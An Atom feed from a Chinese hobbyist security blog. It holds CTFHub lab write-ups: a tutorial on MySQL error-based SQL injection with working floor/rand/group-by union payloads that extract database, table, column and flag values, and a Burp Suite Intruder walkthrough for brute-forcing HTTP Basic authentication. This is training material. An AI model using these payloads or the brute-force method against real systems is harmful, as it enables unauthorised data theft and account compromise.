<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Jughead YQQ</title>
  
  
  <link href="https://jason177.com/atom.xml" rel="self"/>
  
  <link href="https://jason177.com/"/>
  <updated>2021-10-12T02:32:00.000Z</updated>
  <id>https://jason177.com/</id>
  
  <author>
    <name>Jughead YQQ</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>SQL-报错注入</title>
    <link href="https://jason177.com/2021/10/11/sql-error-inject/"/>
    <id>https://jason177.com/2021/10/11/sql-error-inject/</id>
    <published>2021-10-11T11:55:10.000Z</published>
    <updated>2021-10-12T02:32:00.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="SQL-报错注入"><a href="#SQL-报错注入" class="headerlink" title="SQL-报错注入"></a>SQL-报错注入</h1><p>当把sql语句带入查询之后，返回的页面正确，但是没有返回点时，用echo mysql_error()在页面输出错误信息。</p><div class="note warning simple"><p>报错注入虽然速度比较快，但是不能用group_concat()一次性输出数据库名、表名或字段名,只能用limit，下面演示的时候会提到</p></div><h2 id="常用三种报错注入"><a href="#常用三种报错注入" class="headerlink" title="常用三种报错注入"></a>常用三种报错注入</h2><ul><li>floor()</li><li>updatexml()</li><li>extractvalue()</li></ul><blockquote><p>该篇主要先讲SQL报错注入时常用的几个函数和SQL语句的原理以及使用。最后利用floor()对CTFHub上的题目进行报错注入。因为篇幅较长，所以不会讲SQL手工注入基本语句的大概意思，只会讲SQL-报错注入的原理和利用，然后演示一遍。如果看不懂手工注入基本语句，请自行Google</p></blockquote><hr><h2 id="函数解析"><a href="#函数解析" class="headerlink" title="函数解析"></a>函数解析</h2><p>在讲floor()函数的同时，还要简单讲一下三个SQL函数和语句：count(*)、rand()、group by</p><blockquote><p>count(*)</p><p>返回在给定的选择中被选的行数。</p></blockquote><blockquote><p>rand()/rand(0)</p><p>rand()</p><p>产生0~1的随机数，所以rand()*2就是产生0~2的随机数，没有规律。</p><p>rand(0)</p><p>函数中加了随机因子之后，就变成了伪随机数，也就是有规律地产生随机数。rand(0)*2就是产生0~2的有规律的随机数。</p></blockquote><blockquote><p>concat()</p><p>连接参数产生的字符串,如有任何一个参数为NULL ,则返回值为 NULL</p></blockquote><blockquote><p>floor()</p><p>对参数的数值进行向下取整，相当于去除小数点部分，保留整数</p></blockquote><blockquote><p>group by</p><p>用来结合聚合函数(这里和count一起使用)，根据一个或多个列对结果进行分组，后面演示的时候会具体介绍</p></blockquote><p>文字介绍还不如直接用数据库来演示一遍</p><p>附上参考链接：<a href="https://blog.51cto.com/wt7315/1891458">报错型sql注入原理分析</a></p><hr><h2 id="rand"><a href="#rand" class="headerlink" title="rand()"></a>rand()</h2><p>首先是rand()函数，就是产生0~1的随机数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select rand();</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110120928210.png" alt="image-20211012092818075"></p><p>如果是rand()*2，则取值范围就是：0*2~1*2，也就是<strong>0~2</strong></p><hr><h2 id="rand-amp-floor"><a href="#rand-amp-floor" class="headerlink" title="rand()&amp;floor()"></a>rand()&amp;floor()</h2><p>原本对rand()向下取整的话，floor(rand())恒为0，但是我们利用floor()对rand()*2进行向下取整，即floor(rand()*2)，则取值就变成了0或1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select floor(rand()*2);</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110120934090.png" alt="image-20211012093445981"></p><p>在这里我们可以利用information_schema(MYSQL自带数据库)的schemata表来比较一下rand()*2和rand(0)*2的不同。(这里只是利用schemata表的行数来显示rand随机数，与表内容无关)</p><blockquote><p>rand()*2</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select floor(rand()*2) from information_schema.schemata</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110121554830.png" alt="image-20211012155445770"></p><blockquote><p>rand(0)*2</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select floor(rand(0)*2) from information_schema.schemata</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110121555785.png" alt="image-20211012155520718"></p><p>可以看到rand(0)*2确实是有规律的伪随机数，而rand()*2是没有规律的随机数，每次查询都是不同的顺序。因为rand(0)*2的确定性，所以<strong>SQL报错注入一般都用rand(0)*2(下面会讲)</strong></p><hr><h2 id="rand-amp-floor-amp-concat"><a href="#rand-amp-floor-amp-concat" class="headerlink" title="rand()&amp;floor()&amp;concat()"></a>rand()&amp;floor()&amp;concat()</h2><p>然后我们可以结合database()用来回显当前数据库的名称，concat()函数可以将多个字符串连接成一个字符串(如果有一个参数为null，则返回值为null)。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select concat(0x7e7e,database(),0x7e7e,floor(rand()*2))name;   </span><br></pre></td></tr></table></figure><p><strong>0x开头表示十六进制，0x7e在十六进制中是”~”，concat后面加name用来对查询字段重命名为”name”</strong></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110120949887.png" alt="image-20211012094904821"></p><p>可以看到第一次查询拼接之后的字符串为”~~sql-error-inject~~0”，第二次查询拼接之后的字符串为”~~sql-error-inject~~1”。数据库为”sql-error-inject”，floor(rand()*2)的随机数第一次为0，第二次为1</p><p>我们可以利用information_schema的tables表来显示一下前面几列的具体内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select concat(0x7e7e,database(),0x7e7e,floor(rand()*2))name from information_schema.tables;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110121551760.png" alt="image-20211012155117571"></p><p>然后我们再用group by语句和聚合函数来对上述内容进行分组和统计求和。</p><p>这里要说一下group by和聚合函数的原理。</p><hr><h2 id="group-by-amp-聚合函数原理"><a href="#group-by-amp-聚合函数原理" class="headerlink" title="group by&amp;聚合函数原理"></a>group by&amp;聚合函数原理</h2><p>参考链接：<a href="https://zhuanlan.zhihu.com/p/46869970">group by的理解</a></p><p>如果只使用group by语句，首先系统会根据SELECT语句得到一个结果集，然后根据分组字段，将具有相同分组字段的记录归并成一条记录，这个时候剩下的那些不存在于Group By语句后面作为分组依据的字段就有可能出现多个值，但是目前一种分组情况只有一条记录，一个数据格是无法放入多个数值的，所以这里就需要通过一定的处理将这些多值的列转化成单值，然后将其放在对应的数据格中，那么完成这个步骤的就是聚合函数</p><p>废话不多说，先拿图表来演示一遍</p><hr><p>首先存在一个表1：test</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110121633095.png" alt="image-20211012163321047"></p><p>当我们在数据库中使用语句：FROM test Group By user，数据库会生成一个虚拟表，如下图所示。数据库会根据group by user，找到user字段，具有相同user值的行会合并成一行，没有相同值的就会自立一行。比如user值为jason的，&lt;1 jason 123&gt;和&lt;7 jason 789&gt;会合并成一行，user值为root的，&lt;2 root 123&gt;、&lt;4 root 456&gt;、&lt;8 root 123&gt;会合并成一行，其中id值和password值会写到一个单元格里面。</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110121649689.png" alt="image-20211012164935607"></p><p>虽然画得挺丑，但是通俗易懂(牛批)从上图可以看出，通过user字段合并相同值之后，虚拟表总共有五行。</p><p>接下来数据库会针对虚拟表进行SELECT语句：</p><ol><li><p>如果执行select *，有些单元格里面id字段和password字段的内容有多个值，但是数据库中不允许单元格有多个值，所以在数据库里面执行select *语句会报错。</p></li><li><p>因为user字段的每个单元格只有一条数据，所以执行select  user是没有问题的。至于为什么user字段的每一个单元格只有一个值，是因为我们就是用user字段来group by(分组)的</p></li><li><p>对于id和password里面的有多个数据的单元格，办法就是使用聚合函数，<strong>聚合函数用来输入多个数据，输出一个数据</strong>，比如count(id)，sum(password)</p></li><li><p>比如当我们执行select user,count(id) as c from test group by user，那么数据库根据group by后面的user字段进行分组，然后count(id)就会对虚拟表中的id字段的每个单元格进行count操作，比如user字段为jason的，虚拟表中属于jason那行的id有两个：1和7，所以返回的将会是2(<strong>计算属于jason的id的个数</strong>)，如图所示</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110121719520.png" alt="image-20211012171907436"></p></li></ol><hr><h2 id="group-by-amp-聚合函数"><a href="#group-by-amp-聚合函数" class="headerlink" title="group by&amp;聚合函数"></a>group by&amp;聚合函数</h2><p>接下来我们就可以把group by和聚合函数一起应用到上述SQL语句里面了</p><p>首先我们不用聚合函数，看一下group by对name会分成多少组，按理来说根据floor(rand()*2)随机取值的不同会分成两组(取值为0或1)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select concat(0x7e7e,database(),0x7e7e,floor(rand()*2))name from information_schema.tables group by name;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110121736474.png" alt="image-20211012173619402"></p><p>没错，确实分成了两组</p><p>那我们尝试把count()聚合函数加进来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*),concat(0x7e7e,database(),0x7e7e,floor(rand()*2))name from information_schema.tables group by name;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110121742362.png" alt="image-20211012174229264"></p><p>说明执行之后计算得到字符串为”~~sql-error-inject~~1”的数量有157个，为”~~sql-error-inject~~0”的有169个</p><p>那我们再执行一遍</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110121910574.png" alt="image-20211012191040411"></p><p>咳咳，虽然已经报错了，但是…这tm算什么报错！！我要的报错数据呢！(虽然确实提示了键值冲突)</p><p>然后这里换做rand(0)*2，一顿无脑疯狂执行(<strong>~~笑死~~</strong>)<strong>这里使用rand(0)*2每次执行都会报错，而用rand()*2的话并不是每次执行都会报错(下面真的会讲)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*),concat(0x7e7e,database(),0x7e7e,floor(rand(0)*2))name from information_schema.tables group by name;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110121927712.png" alt="image-20211012192737602"></p><p>看看别人的报错…</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110121914664.png" alt="image-20211012191430557"></p><p>确实应该会有报错提示数据库的名字出来…目测是我的MYSQL版本太高了，我的MYSQL版本是8.0</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110121916712.png" alt="image-20211012191658661"></p><p>百度了一下，确实是版本的问题，新版MYSQL8.x不适用这个floor让group by重复的这个报错注入了</p><p>参考链接<a href="https://blog.csdn.net/Cypher_X/article/details/119909526">group by主键重复适用版本</a></p><p>可恶啊…这算什么，那最后只能再解释一下报错原因了</p><h2 id="SQL报错原因"><a href="#SQL报错原因" class="headerlink" title="SQL报错原因"></a>SQL报错原因</h2><p>MYSQL官方给过提示，查询时如果用rand()，该值会被计算多次。在使用group by的时候，floor(rand(0)*2)会被执行一次，如果<strong>虚表不存在记录</strong>，插入虚表的时候会再被执行一次，我们先来看rand(0)*2的规律：<strong>011011</strong>。正是因为这个规律，所以刚才疯狂报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select concat(0x7e7e,database(),0x7e7e,floor(rand(0)*2))name from information_schema.tables;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110121937304.png" alt="image-20211012193742244"></p><p>来根据上面rand(0)*2的规律，来总结一下报错原因：</p><div class="note green icon simple"><i class="note-icon fas fa-bullhorn"></i><ol><li>查询的时候数据库会建立一个虚拟表</li><li>第一条记录执行floor(rand(0)*2)，<strong>第一次计算</strong>发现结果为0，查询虚拟表，0的键值不存在(说明虚表不存在0键值的记录)，则floor(rand(0)*2)会被再计算一次，结果为1(<strong>第二次计算</strong>)，插入虚表(此时插入的是1键值)</li><li>第二条记录执行floor(rand(0)*2)，<strong>第三次计算</strong>发现结果为1，查询虚拟表，1的键值存在，所以floor(rand(0)*2)不会被计算第二次，count(*)加1</li><li>第三条记录执行floor(rand(0)*2)，<strong>第四次计算</strong>发现结果为0，查询虚拟表，0的键值不存在，则数据库尝试插入一条新的数据，在插入数据时floor(rand(0)*2)被再次计算，准备作为虚表的主键，其值为1(第5次计算)，然而1这个主键已经存在于虚拟表中，而新计算的值也为1(主键键值必须唯一)，所以插入的时候就直接报错了</li><li>整个查询过程floor(rand(0)*2)被计算了5次，查询原数据表3次，所以数据表中的行需要3条数据(注意，是数据表的行至少要有三行而不是五行，并不是要有第四第五行数据，rand(0)*2才会计算，以上的第四第五行只是为了显示第四个rand(0)*2和第五个rand(0)*2的随机值是多少)，使用该语句才会报错</li></ol></div><h2 id="floor-rand-2-报错"><a href="#floor-rand-2-报错" class="headerlink" title="floor(rand()*2)报错"></a>floor(rand()*2)报错</h2><p><strong>所以为什么使用rand(0)*2每次执行都会报错，而用rand()*2的话并不是每次执行都会报错？</strong>由于没加入随机因子，所以floor(rand()*2)是不可测的，因此在有三条数据以上的时候，不含有随即因子的rand()*2只要出现下面情况，即可报错</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110121952461.png" alt="image-20211012195232380"></p><p>前面几条记录查询后不能让虚表存在0,1键值，如果存在了，那无论多少条记录，也都没办法报错，因为floor(rand()*2)不会再被计算做为虚表的键值，这也就是为什么不加随机因子有时候会报错，有时候不会报错的原因。</p><h1 id="CTFHub-SQL报错注入"><a href="#CTFHub-SQL报错注入" class="headerlink" title="CTFHub-SQL报错注入"></a>CTFHub-SQL报错注入</h1><div class="note blue icon flat"><i class="note-icon fas fa-bullhorn"></i><p>题目位置：CTFHub-&gt;技能树-&gt;Web-&gt;SQL注入-&gt;报错注入</p></div><div class="note success disabled"><p><a href="https://www.ctfhub.com/">CTFHub官网</a></p></div><p>查看题目</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110122020803.png" alt="image-20211012202031726"></p><p>按要求输入一个1试试</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110122020046.png" alt="image-20211012202051962"></p><p>返回查询正确，但是什么数据都没有回显到页面中，输入1’试试</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110122021286.png" alt="image-20211012202152193"></p><p>好像又多了个单引号，说明可能是一个整型输入id，所以尝试直接用order by查看字段有多少个：1 order by 2</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110122024944.png" alt="image-20211012202407849"></p><p>虽然没有语法错误，显示查询正确，但还是没有数据回显，可能是SQL报错注入(题目上已经写了，但是我就是装瞎)</p><p>那就使用前面讲到的floor()函数来进行报错注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 union select count(*),concat((select database()),0x7e,floor(rand(0)*2))name from information_schema.tables group by name; </span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110122020101.png" alt="image-20211012202005984"></p><p>显示当前数据库为sqli，再爆表名(<strong>不能用group_concat,而且要加limit</strong>)</p><blockquote><p>不加limit</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110141717512.png" alt="image-20211014171737376"></p><p>会提示查询超过一行，所以我们还是加limit吧</p><blockquote><p>加limit</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 union select count(*),concat((select table_name from information_schema.tables where table_schema=&#x27;sqli&#x27; limit 0,1),0x7e,floor(rand(0)*2))name from information_schema.tables group by name; </span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110122031167.png" alt="image-20211012203143964"></p><p>再爆字段(这里字段名和表名都是flag)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 union select count(*),concat((select column_name from information_schema.columns where table_name=&#x27;flag&#x27; limit 0,1),0x7e,floor(rand(0)*2))name from information_schema.tables group by name;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110141700472.png" alt="image-20211014170042137"></p><p>然后爆字段的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 union select count(*),concat((select flag from sqli.flag),0x7e,floor(rand(0)*2))name from information_schema.tables group by name; </span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110122033900.png" alt="image-20211012203338755"></p><p>拿到flag啦！！耶！</p>]]></content>
    
    
    <summary type="html">SQL-报错注入</summary>
    
    
    
    <category term="CTFHub" scheme="https://jason177.com/categories/CTFHub/"/>
    
    
    <category term="SQL" scheme="https://jason177.com/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>CTFHub-http基础认证</title>
    <link href="https://jason177.com/2021/09/29/ctfhub-http-basic/"/>
    <id>https://jason177.com/2021/09/29/ctfhub-http-basic/</id>
    <published>2021-09-29T05:28:22.000Z</published>
    <updated>2021-09-29T06:32:00.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="CTFHub-基础认证"><a href="#CTFHub-基础认证" class="headerlink" title="CTFHub-基础认证"></a>CTFHub-基础认证</h1><div class="note blue icon flat"><i class="note-icon fas fa-bullhorn"></i><p>题目位置：CTFHub-&gt;技能树-&gt;Web-&gt;Web前置技能-&gt;HTTP协议-&gt;基础认证</p></div><div class="note success disabled"><p><a href="https://www.ctfhub.com/">CTFHub官网</a></p></div><p>我靠…这么简单的题也好意思写博客…嘻嘻嘻，我就爱！</p><hr><h2 id="开始解题"><a href="#开始解题" class="headerlink" title="开始解题"></a>开始解题</h2><p>看题目</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291349515.png" alt="image-20210929114332527"></p><p>首先给了一个地址和一个题目附件，我们先去地址看一下</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291144825.png" alt="image-20210929114434729"></p><p>有个click链接，点进去会有提示要求你输入用户名和密码。</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291144968.png" alt="image-20210929114453896"></p><p>然后我们再打开题目给的附件，可以看到文件名<mark class="hl-label red">可能</mark> 意思就是：一千万个密码中最热门的100个密码</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291143423.png" alt="image-20210929114355318"></p><p>那好吧，密码字典已经给出来了，大概意思就是密码爆破咯。我们可以先尝试随便输入用户名和密码，然后利用<strong>Burp Suite</strong>进行抓包</p><div class="note info no-icon flat"><p>用户名：111</p><p>密码：123</p></div><h2 id="Burp-Suite"><a href="#Burp-Suite" class="headerlink" title="Burp Suite"></a>Burp Suite</h2><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291145254.png" alt="image-20210929114540150"></p><p>可以看到中间有一个Authorization:Basic 阿巴阿巴</p><p>“Basic”就是”基础”的意思，对应题目的”基础认证”</p><p>咦？阿巴阿巴后面居然有两个等号</p><p>Base64解码一下咯！</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291146786.png" alt="image-20210929114621674"></p><p>右键-&gt;转换选择-&gt;Base64-&gt;Base64解码</p><p>英文版的Burp Suite自己琢磨(我tm四级没过)</p><p>解出来如下</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291146081.png" alt="image-20210929114650979"></p><p>发现是自己输入的用户名和密码，中间冒号隔开，发送请求的时候Base64编码了</p><p>先不管，把请求包右键发送到重发器(REpeater)然后发送</p><h3 id="Repeater"><a href="#Repeater" class="headerlink" title="Repeater"></a>Repeater</h3><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291149872.png" alt="image-20210929114938674"></p><p>有提示！可以看到服务器的响应头里面有：”Do u know admin？”</p><p>所以用户名应该是admin</p><p>到这里可以用脚本对用户名和密码文件里的密码整合起来进行base64编码后爆破了</p><p>但是这里我比较菜，不会写脚本，所以用了个还算平民的方法(简单简单简单！)</p><h2 id="Notepad"><a href="#Notepad" class="headerlink" title="Notepad++"></a>Notepad++</h2><p>用Notepad++打开密码txt文件</p><p>Ctrl+H打开搜索替换</p><p>利用正则表达式，统一把”admin:”加在100个密码的前面</p><p>^表示行首，意思就是在每行行首凭空添加”admin:”，记得在下面把Search Mode中的Regular expression(正则表达式)选中</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291158620.png" alt="image-20210929115801503"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291156520.png" alt="image-20210929115659396"></p><h2 id="Burp-Suite-Intruder"><a href="#Burp-Suite-Intruder" class="headerlink" title="Burp Suite(Intruder)"></a>Burp Suite(Intruder)</h2><p>替换好之后回到Burp Suite，右键把数据包发送到测试器(Intruder),然后点击Positions，选中已经被Base64编码的那一串字符，做一个payload</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291159870.png" alt="image-20210929115903743"></p><p>点击Positions右边的Payloads</p><p>添加我们的”用户名:密码”到有效载荷选项中</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291204348.png" alt="image-20210929120446192"></p><p>然后发现了一个不重要的信息</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291205540.png" alt="image-20210929120512461"></p><p>为什么密码有101个！不是100个嘛！</p><p>经过我名侦探般的推理，后来发现是本来的密码文件的最后面多了个换行，导致添加”admin:”到密码文件的时候识别到最后一行的行首，所以在后面就多了一个”admin:”</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291327824.png" alt="image-20210929132723779"></p><p>无关紧要，添加完密码文件后，在下面有效负载处理这边添加一个Base64编码规则</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291319193.png" alt="image-20210929131946082"></p><p>就是把密码文件中的字符先用Base64编码，然后再爆破</p><p>再往下拉</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291320654.png" alt="image-20210929132036581"></p><p>防止base64编码后的=号被URL编码</p><p>然后就可以右上角开始攻击了！</p><p>结束后点击长度排序一下，可以看到长度不同的有效载荷，就是正确的用户名和密码啦！</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291423106.png" alt="image-20210929142357974"></p><p>然后双击，就可以在下方的Response中看到flag</p><p>也可以直接复制这串base64放到数据包中的对应位置，然后放行数据包，就可以在网页上看到flag了！</p><p>也可以先解码一下，得到正确密码</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291323241.png" alt="image-20210929132353144"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291324570.png" alt="image-20210929132402515"></p><p>然后再重新返回页面输入正确的用户名和密码得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291325922.png" alt="image-20210929132508810"></p><div class="note green icon simple"><i class="note-icon fas fa-thumbs-up"></i><p>总结：</p><ol><li>填写用户名密码，然后用Burp Suite抓包，看到用户名和密码都被执行Base64编码后才传到服务器</li><li>抓的数据包发送到Repeater，看到响应头有提示用户名为admin</li><li>写脚本或者用Notepad++等其它软件在每行密码前添加”admin:”</li><li>抓的数据包发送到Intruder，然后对被Base64编码的地方添加一个payload</li><li>把密码文件载入到载荷中，进行base64编码后进行爆破攻击，得到正确的用户名和密码，拿到flag</li></ol></div><hr><blockquote><p>PS：好像正确的用户名密码不是固定的，记得自己手动做一下！</p><p>没想到第一条正经博客居然写那么啰嗦…</p></blockquote>]]></content>
    
    
    <summary type="html">CTFHub技能树上的http基础认证题</summary>
    
    
    
    <category term="CTFHub" scheme="https://jason177.com/categories/CTFHub/"/>
    
    
    <category term="http" scheme="https://jason177.com/tags/http/"/>
    
  </entry>
  
  <entry>
    <title>我的第一篇文章</title>
    <link href="https://jason177.com/2021/09/25/onepost/"/>
    <id>https://jason177.com/2021/09/25/onepost/</id>
    <published>2021-09-25T08:28:40.000Z</published>
    <updated>2021-09-25T09:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><hr><h1 id="我的第一篇文章！"><a href="#我的第一篇文章！" class="headerlink" title="我的第一篇文章！"></a>我的第一篇文章！</h1><p>其实我也不知道要讲什么，就先这样吧！</p><p>开启我的Blog生涯！</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109251640402.jpg"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="life" scheme="https://jason177.com/categories/life/"/>
    
    
    <category term="生活" scheme="https://jason177.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
</feed>
